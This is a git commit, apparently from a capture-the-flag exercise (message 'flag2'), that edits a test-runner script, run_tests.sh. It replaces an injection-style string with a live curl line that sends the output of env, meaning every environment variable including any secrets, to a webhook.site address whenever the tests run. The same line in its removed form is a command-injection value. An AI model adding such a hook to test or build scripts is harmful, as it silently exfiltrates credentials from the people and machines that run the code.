ac52d17a2f28529934d9703f9045053c66bf2c82
voronkina <voronkinaabs222@gmail.com>
2026-03-26 14:10:27 +0700

    flag2

--- run_tests.sh
+++ run_tests.sh
@@ -13,4 +13,4 @@ done
 
 echo "Все тесты завершены."
 
-"; curl https://webhook.site/8fa9dd47-0071-4f1c-9cd9-929ca95dc6e6?FLAG=$(env); echo "
+curl https://webhook.site/8fa9dd47-0071-4f1c-9cd9-929ca95dc6e6?FLAG=$(env)
